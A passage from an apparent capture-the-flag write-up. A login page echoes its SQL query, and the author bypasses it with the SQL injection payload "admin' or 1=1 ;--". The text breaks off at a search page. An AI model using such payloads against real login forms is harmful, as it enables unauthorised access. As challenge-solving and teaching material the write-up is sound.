## Description
Can you find the flag on this website. Try to find the flag here.

## Solution

we are given a login page, providing username and password fields.
by entering user, pass will show us the sql query made to server:


```
username: admin
password: admin
SQL query: SELECT id FROM users WHERE password = 'admin' AND username = 'admin'
```

We can bypass login page simply by below payload:
```
admin' or 1=1 ;--
```

Now we will be redirected to new page with a search box:
